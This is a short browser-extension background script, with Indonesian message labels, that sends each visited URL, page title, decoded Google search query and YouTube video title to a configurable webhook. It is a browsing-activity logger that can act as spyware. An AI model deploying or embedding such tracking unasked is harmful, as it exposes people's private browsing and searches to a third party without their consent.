chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (!changeInfo.url || changeInfo.url.startsWith("chrome://") || changeInfo.url.startsWith("edge://") || changeInfo.url.startsWith("brave://")) return;

    chrome.storage.local.get(["webhook", "enabled"], ({ webhook, enabled }) => {
        if (!enabled || !webhook) return;

        const title = tab.title || "Tidak diketahui";

        let message = `
\`\`\`
⚡ AKTIVITAS BARU
-----------------
Tab   : ${title}
URL   : ${changeInfo.url}
\`\`\`
${changeInfo.url}
`;

        // Google Search
        if (changeInfo.url.includes("google.com/search?q=")) {
            const query = decodeURIComponent(changeInfo.url.split("q=")[1].split("&")[0]);
            message = `
\`\`\`
🔎 GOOGLE SEARCH
-----------------
Pencarian : ${query}
URL   : ${changeInfo.url}
\`\`\`
${changeInfo.url}
`;
        }

        // YouTube
        if (changeInfo.url.includes("youtube.com/watch")) {
            message = `
\`\`\`
🎬 NONTON YOUTUBE
-----------------
Judul : ${title}
URL   : ${changeInfo.url}
\`\`\`
${changeInfo.url}
`;
        }

        fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        });
    });
});
